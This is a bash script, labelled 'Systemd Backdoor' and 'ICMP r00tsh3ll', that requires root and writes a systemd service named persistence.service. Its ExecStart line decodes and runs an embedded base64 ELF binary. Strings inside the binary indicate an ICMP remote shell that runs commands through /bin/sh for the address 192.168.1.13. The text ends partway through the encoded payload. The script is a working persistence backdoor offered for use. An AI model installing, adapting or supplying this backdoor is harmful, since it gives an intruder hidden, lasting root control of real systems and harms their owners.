#!/bin/bash
# Simple script to automate systemd persistence
# https://youtube.com/c/MatheuZSecurity

red='\033[33;31m'
green='\033[33;32m'

if [[ $(id -u) -ne "0" ]]; then
        echo "[ERROR] You must run this script as root" >&2
        exit 1
fi
echo -ne "$red
  ██████▓██   ██▓  ██████ ▄▄▄█████▓▓█████  ███▄ ▄███▓▓█████▄                     
▒██    ▒ ▒██  ██▒▒██    ▒ ▓  ██▒ ▓▒▓█   ▀ ▓██▒▀█▀ ██▒▒██▀ ██▌                    
░ ▓██▄    ▒██ ██░░ ▓██▄   ▒ ▓██░ ▒░▒███   ▓██    ▓██░░██   █▌                    
  ▒   ██▒ ░ ▐██▓░  ▒   ██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██    ▒██ ░▓█▄   ▌                    
▒██████▒▒ ░ ██▒▓░▒██████▒▒  ▒██▒ ░ ░▒████▒▒██▒   ░██▒░▒████▓                     
▒ ▒▓▒ ▒ ░  ██▒▒▒ ▒ ▒▓▒ ▒ ░  ▒ ░░   ░░ ▒░ ░░ ▒░   ░  ░ ▒▒▓  ▒                     
░ ░▒  ░ ░▓██ ░▒░ ░ ░▒  ░ ░    ░     ░ ░  ░░  ░      ░ ░ ▒  ▒                     
░  ░  ░  ▒ ▒ ░░  ░  ░  ░    ░         ░   ░      ░    ░ ░  ░                     
      ░  ░ ░           ░              ░  ░       ░      ░                        
         ░ ░                                          ░                          
             ▄▄▄▄    ▄▄▄       ▄████▄   ██ ▄█▀▓█████▄  ▒█████   ▒█████   ██▀███  
            ▓█████▄ ▒████▄    ▒██▀ ▀█   ██▄█▒ ▒██▀ ██▌▒██▒  ██▒▒██▒  ██▒▓██ ▒ ██▒
            ▒██▒ ▄██▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ░██   █▌▒██░  ██▒▒██░  ██▒▓██ ░▄█ ▒
            ▒██░█▀  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░▓█▄   ▌▒██   ██░▒██   ██░▒██▀▀█▄  
            ░▓█  ▀█▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▓ ░ ████▓▒░░ ████▓▒░░██▓ ▒██▒
            ░▒▓███▀▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
            ▒░▒   ░   ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░ ▒ ▒░   ░▒ ░ ▒░
             ░    ░   ░   ▒   ░        ░ ░░ ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░ ░ ▒    ░░   ░ 
             ░            ░  ░░ ░      ░  ░      ░        ░ ░      ░ ░     ░     
                  ░           ░                ░                                "



echo -ne "$green\n"

echo -ne "[*] ICMP r00tsh3ll for ever [*]\n\n"

echo -ne "[*] Edited by - @ferreiraklet\n"


arr=('.' '..' '...' '....')

for c in $(seq 1); do
        for elt in ${arr[*]}; do
                echo -ne "\r\033[<1>Ainitializing the service $elt" && sleep 0.1;
        done
done

echo -ne "\n"

function SystemdPersistence () {
   echo "[Unit]" > /etc/systemd/system/persistence.service
   echo "Description= Systemd Persistence" >> /etc/systemd/system/persistence.service
   echo "" >> /etc/systemd/system/persistence.service
   echo "[Service]" >> /etc/systemd/system/persistence.service
   echo "User=root" >> /etc/systemd/system/persistence.service
   echo "Group=root" >> /etc/systemd/system/persistence.service
   echo "WorkingDirectory=/root" >> /etc/systemd/system/persistence.service
   echo $'ExecStart=/bin/bash -c "echo f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAABIAAAAAAABAAAAAAAAAALhBAAAAAAAAAAAAAEAAOAALAEAAHgAdAAYAAAAEAAAAQAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAaAIAAAAAAABoAgAAAAAAAAgAAAAAAAAAAwAAAAQAAACoAgAAAAAAAKgCAAAAAAAAqAIAAAAAAAAcAAAAAAAAABwAAAAAAAAAAQAAAAAAAAABAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAMAAAAAAAAEAwAAAAAAAAAEAAAAAAAAAEAAAAFAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAA7QoAAAAAAADtCgAAAAAAAAAQAAAAAAAAAQAAAAQAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAADAAgAAAAAAAMACAAAAAAAAABAAAAAAAAABAAAABgAAANgtAAAAAAAA2D0AAAAAAADYPQAAAAAAADADAAAAAAAA8AMAAAAAAAAAEAAAAAAAAAIAAAAGAAAA6C0AAAAAAADoPQAAAAAAAOg9AAAAAAAA8AEAAAAAAADwAQAAAAAAAAgAAAAAAAAABAAAAAQAAADEAgAAAAAAAMQCAAAAAAAAxAIAAAAAAABEAAAAAAAAAEQAAAAAAAAABAAAAAAAAABQ5XRkBAAAAGQgAAAAAAAAZCAAAAAAAABkIAAAAAAAAHQAAAAAAAAAdAAAAAAAAAAEAAAAAAAAAFHldGQGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAUuV0ZAQAAADYLQAAAAAAANg9AAAAAAAA2D0AAAAAAAAoAgAAAAAAACgCAAAAAAAAAQAAAAAAAAAvbGliNjQvbGQtbGludXgteDg2LTY0LnNvLjIABAAAABQAAAADAAAAR05VAMm1bGPoXITn9LL6aAVjCgO8MqB2BAAAABAAAAABAAAAR05VAAAAAAADAAAAAgAAAAAAAAACAAAAIQAAAAEAAAAGAAAAAACBAAABEAAhAAAAAAAAACgdjBzRZc5tAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAEAABIAAAAAAAAAAAAAAAAAAAAAAAAASgAAABIAAAAAAAAAAAAAAAAAAAAAAAAAjQAAABIAAAAAAAAAAAAAAAAAAAAAAAAAeQAAABIAAAAAAAAAAAAAAAAAAAAAAAAAAQAAACAAAAAAAAAAAAAAAAAAAAAAAAAAKAEAABIAAAAAAAAAAAAAAAAAAAAAAAAApgAAABIAAAAAAAAAAAAAAAAAAAAAAAAAuwAAABIAAAAAAAAAAAAAAAAAAAAAAAAA0wAAABIAAAAAAAAAAAAAAAAAAAAAAAAA9wAAABIAAAAAAAAAAAAAAAAAAAAAAAAArQAAABIAAAAAAAAAAAAAAAAAAAAAAAAAXgAAABIAAAAAAAAAAAAAAAAAAAAAAAAANwAAABIAAAAAAAAAAAAAAAAAAAAAAAAAgQAAABIAAAAAAAAAAAAAAAAAAAAAAAAAWQAAABIAAAAAAAAAAAAAAAAAAAAAAAAALgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAwQAAABIAAAAAAAAAAAAAAAAAAAAAAAAAoAAAABIAAAAAAAAAAAAAAAAAAAAAAAAA3wAAABIAAAAAAAAAAAAAAAAAAAAAAAAAdgEAACAAAAAAAAAAAAAAAAAAAAAAAAAA6QAAABIAAAAAAAAAAAAAAAAAAAAAAAAA8AAAABIAAAAAAAAAAAAAAAAAAAAAAAAAbAAAABIAAAAAAAAAAAAAAAAAAAAAAAAAmgAAABIAAAAAAAAAAAAAAAAAAAAAAAAAhgAAABIAAAAAAAAAAAAAAAAAAAAAAAAAPQAAABIAAAAAAAAAAAAAAAAAAAAAAAAAEwEAABIAAAAAAAAAAAAAAAAAAAAAAAAAHQAAACAAAAAAAAAAAAAAAAAAAAAAAAAAcwAAABIAAAAAAAAAAAAAAAAAAAAAAAAAlQAAABIAAAAAAAAAAAAAAAAAAAAAAAAAtAAAABIAAAAAAAAAAAAAAAAAAAAAAAAAZQAAABIAAAAAAAAAAAAAAAAAAAAAAAAA2AAAABEAGQAgQQAAAAAAAAgAAAAAAAAABAEAACIAAAAAAAAAAAAAAAAAAAAAAAAAAF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAGNsb3NlAHB0aHJlYWRfam9pbgBwdGhyZWFkX2NyZWF0ZQByZWFkAHNlbmR0bwBzb2NrZXQAZmZsdXNoAGV4ZWN2AHN0cm5jbXAAcGlwZQBwZXJyb3IAc3RybmNweQBmb3JrAHBvcGVuAGZnZXRzAHN0cmxlbgBtZW1zZXQAc3Ryc3RyAGNoZGlyAHB0aHJlYWRfYXR0cl9pbml0AGR1cDIAc3Rkb3V0AGluZXRfYWRkcgBtZW1jcHkAbWFsbG9jAGdldHRpbWVvZmRheQBfX2N4YV9maW5hbGl6ZQBwdGhyZWFkX2F0dHJfZGVzdHJveQBmY250bABfX2xpYmNfc3RhcnRfbWFpbgBmcmVlAGxpYnB0aHJlYWQuc28uMABsaWJjLnNvLjYAR0xJQkNfMi4yLjUAR0xJQkNfMi4xNABfX2dtb25fc3RhcnRfXwAAAAACAAMAAgACAAAAAgACAAIAAgACAAIAAwADAAIAAwACAAIAAgACAAAABAACAAIAAgACAAMAAgAAAAIAAgACAAIAAgACAAAAAAABAAEARQEAABAAAAAgAAAAdRppCQAAAwBfAQAAAAAAAAEAAgBVAQAAEAAAAAAAAACUkZYGAAAEAGsBAAAQAAAAdRppCQAAAgBfAQAAAAAAANg9AAAAAAAACAAAAAAAAADgEgAAAAAAAOA9AAAAAAAACAAAAAAAAACgEgAAAAAAAABBAAAAAAAACAAAAAAAAAAAQQAAAAAAANg/AAAAAAAABgAAAAUAAAAAAAAAAAAAAOA/AAAAAAAABgAAABAAAAAAAAAAAAAAAOg/AAAAAAAABgAAABQAAAAAAAAAAAAAAPA/AAAAAAAABgAAABwAAAAAAAAAAAAAAPg/AAAAAAAABgAAACIAAAAAAAAAAAAAACBBAAAAAAAABQAAACEAAAAAAAAAAAAAABhAAAAAAAAABwAAAAEAAAAAAAAAAAAAACBAAAAAAAAABwAAAAIAAAAAAAAAAAAAAChAAAAAAAAABwAAAAMAAAAAAAAAAAAAADBAAAAAAAAABwAAAAQAAAAAAAAAAAAAADhAAAAAAAAABwAAAAYAAAAAAAAAAAAAAEBAAAAAAAAABwAAAAcAAAAAAAAAAAAAAEhAAAAAAAAABwAAAAgAAAAAAAAAAAAAAFBAAAAAAAAABwAAAAkAAAAAAAAAAAAAAFhAAAAAAAAABwAAAAoAAAAAAAAAAAAAAGBAAAAAAAAABwAAAAsAAAAAAAAAAAAAAGhAAAAAAAAABwAAAAwAAAAAAAAAAAAAAHBAAAAAAAAABwAAAA0AAAAAAAAAAAAAAHhAAAAAAAAABwAAAA4AAAAAAAAAAAAAAIBAAAAAAAAABwAAAA8AAAAAAAAAAAAAAIhAAAAAAAAABwAAABEAAAAAAAAAAAAAAJBAAAAAAAAABwAAABIAAAAAAAAAAAAAAJhAAAAAAAAABwAAABMAAAAAAAAAAAAAAKBAAAAAAAAABwAAABUAAAAAAAAAAAAAAKhAAAAAAAAABwAAABYAAAAAAAAAAAAAALBAAAAAAAAABwAAABcAAAAAAAAAAAAAALhAAAAAAAAABwAAABgAAAAAAAAAAAAAAMBAAAAAAAAABwAAABkAAAAAAAAAAAAAAMhAAAAAAAAABwAAABoAAAAAAAAAAAAAANBAAAAAAAAABwAAABsAAAAAAAAAAAAAANhAAAAAAAAABwAAAB0AAAAAAAAAAAAAAOBAAAAAAAAABwAAAB4AAAAAAAAAAAAAAOhAAAAAAAAABwAAAB8AAAAAAAAAAAAAAPBAAAAAAAAABwAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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xkABALgAAAAA6G3///9Ii1XwZolCBLgAAAAA6Fv///9Ii1XwZolCBouVvPv//0iLRfBIjUgISIuFwPv//0iJxkiJz+jg+///SI1F0LoQAAAAvgAAAABIicfoSvv//2bHRdACAIuFyPv//4lF1EiLRfBmx0ACAACLhbz7//+DwAiJwkiLRfCJ1kiJx+hd/v//SItV8GaJQgKLhbz7//9IjVAISI1N0EiLdfCLhcz7//9BuRAAAABJici5AAAAAInH6PP6//+JReyDfez/dRNIjT0XCgAA6I77///HRfz/////SI2F0Pv//7oABAAAvgAAAABIicforvr//0iNjdD7//+Lhcz7//+6/wMAAEiJzonH6NL6//+JRexIi0XwSInH6PP5//+LRfzJw1VIieVIjT2+CQAA6N76//+JxosF5ioAALkFAAAASI0VsgkAAInH6E7+//9dw1VIieVIgeygIAAASIm9aN///7oBAAAAvgMAAAC/AgAAAOhL+///iUX0g330/3UMSI09eQkAAOjW+v//ugAAAAC+AwAAAL8AAAAAuAAAAADorfn//4lF8IFN8AAIAACLRfCJwr4EAAAAvwAAAAC4AAAAAOiK+f//x4Vp+///bjB4c2bHhW37//9oX8aFb/v//wBIjQUeCQAASIlF6EiNhcD7//+6AAQAAL4AAAAASInH6Jz5//9IjY3A+///i0X0uv8DAABIic6Jx+jD+f//iUXkg33kAH7FSI2FwPv//0iJRdiLReSD+BR2sotF5IPoFIlF5EiLRdhIg8AUSIlF0ItF5IP4CHY0i0Xkg+gIiUXkSItF0EiDwAhIiUX4i0XkSGPQSItF+EgB0MYAAEiLBX4pAABIicfotvn//0iNlWn7//9Ii0X4SInWSInH6BD6//9IiUXISIN9yAAPhD0BAABIi0X4SInH6KX4//9IjVD6SItF+EiNSAZIjYVg4///SInOSInH6Ff4//9IjYVg4///ugMAAABIjTUZCAAASInH6Ez4//+FwHVZSI2VYOv//0iNhWDj//9IidZIicfotPr//4XAdB9Ii0XYi3AMi0X0uRQAAABIjRXeBwAAicfoafz//+sdSItF2ItwDItF9LkCAAAASI0V1AcAAInH6Er8//9IjYVg4///SI01wgcAAEiJx+jp+P//SIlFwEiDfcAAdT9Ii0XYi3AMi0X0uRUAAABIjRWbBwAAicfoDPz//+lX/v//SItF2ItwDEiNlXDf//+LRfS56AMAAInH6Or7//9Ii1XASI2FcN///77nAwAASInH6Df4//9IhcB1xkiNhWDj//+6AAgAAL4AAAAASInH6Ln3///p//3//0iLRdiLcAxIi1X4i0X0uQgAAACJx+iV+///6eD9//9VSInlSIPsMIl93EiJddBIi0XQSIsASIkFECgAALoBAAAAvgMAAAC/AgAAAOiE+P//iQXeJwAAiwXYJwAAg/j/dRZIjT2qBgAA6Af4//+4/////+n5AAAASI09vicAAOhh9///SI09uicAAOhV9///6CD4//+JBdInAACLBcwnAACFwA+FkAAAAIsFhicAAInH6B/3//+LBYEnAACJx+gS9///iwWAJwAAicfoBff//0iNBXcGAABIiUXgSMdF6AAAAABIjQVkBgAASIlF8IsFUScAAL4AAAAAicfolfb//4sFOycAAL4BAAAAicfog/b//4sFKScAAL4CAAAAicfocfb//0iNVeBIi0XwSInWSInH6G73///rM74AAAAASI09H/z//+hT+f//SIlF+IsF4SYAAInH6Hr2//9Ii0X4vgAAAABIicfoGff//7gAAAAAycNmkEFXTI09TyMAAEFWSYnWQVVJifVBVEGJ/FVIjS1AIwAAU0wp/UiD7AjoU/X//0jB/QN0GzHbDx8ATInyTInuRInnQf8U30iDwwFIOd116kiDxAhbXUFcQV1BXkFfww8fAMMAAABIg+wISIPECMMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAIAc2VuZHRvADE5Mi4xNjguMS4xMwBoZWxsbwBzb2NrZXQAY2QgAENvdWxkIG5vdCBjZCB0byBwYXRoAE9LAHIARXJyb3IgZXhlY3V0aW5nIHBvcGVuAC9iaW4vc2gAAAAAARsDO3AAAAANAAAAvO///7wAAACM8f//5AAAAJzx//+MAAAAgfL///wAAABE8///HAEAAKHz//88AQAAL/T//1wBAABX9P//fAEAAN71//+cAQAAC/b//7wBAADH+P//2AEAABz6///8AQAAfPr//0QCAAAUAAAAAAAAAAF6UgABeBABGwwHCJABBxAUAAAAHAAAAAjx//8rAAAAAAAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAPju///QAQAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAACg8P//CAAAAAAAAAAAAAAAHAAAAFwAAAB98f//wwAAAABBDhCGAkMNBgK+DAcIAAAcAAAAfAAAACDy//9dAAAAAEEOEIYCQw0GAlgMBwgAABwAAACcAAAAXfL//44AAAAAQQ4QhgJDDQYCiQwHCAAAHAAAALwAAADL8v//KAAAAABBDhCGAkMNBmMMBwgAAAAcAAAA3AAAANPy//+HAQAAAEEOEIYCQw0GA4IBDAcIABwAAAD8AAAAOvT//y0AAAAAQQ4QhgJDDQZoDAcIAAAAGAAAABwBAABH9P//vAIAAABBDhCGAkMNBgAAACAAAAA4AQAA5/b//1MBAAAAQQ4QhgJDDQYDTgEMBwgAAAAAAEQAAABcAQAAGPj//10AAAAAQg4QjwJJDhiOA0UOII0ERQ4ojAVEDjCGBkgOOIMHRw5Aag44QQ4wQQ4oQg4gQg4YQg4QQg4IABAAAACkAQAAMPj//wEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA